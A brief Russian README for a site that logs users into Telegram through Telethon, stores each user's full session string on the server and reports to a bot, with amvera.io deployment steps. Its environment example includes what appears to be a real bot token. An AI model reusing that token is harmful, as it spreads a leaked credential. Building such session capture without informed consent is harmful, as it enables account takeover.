# Busy User — Login Site

## Структура

```
index.html    — фронтенд (страница входа)
backend.py    — FastAPI сервер (авторизация через Telethon)
requirements.txt
amvera.yml
```

## Настройка перед деплоем

### 1. Получите API_ID и API_HASH
Зайдите на https://my.telegram.org → API development tools → создайте приложение.

### 2. Переменные окружения (в amvera или .env)
```
TG_API_ID=12345678
TG_API_HASH=abcdef1234567890abcdef1234567890
BOT_TOKEN=8445674384:AAFJLzGv4hoKeChSFeRBbmGx_RwDCHyiO8g
```

### 3. В index.html замените API_BASE
```js
const API_BASE = 'https://ваш-домен.amvera.io';
```

## Что происходит при входе

1. Пользователь вводит номер → `POST /send_code` → Telethon запрашивает код у Telegram
2. Пользователь вводит код → `POST /verify_code` → Telethon авторизуется
3. StringSession сохраняется в `/data/sessions/<user_id>.session`
4. Бот получает сообщение: "✅ Аккаунт успешно подключён!"
5. Страница показывает экран успеха

## Деплой на amvera.io

```bash
git init
git add .
git commit -m "init"
git remote add amvera https://git.amvera.io/username/login-site
git push amvera master
```

Не забудьте добавить переменные окружения в панели amvera.
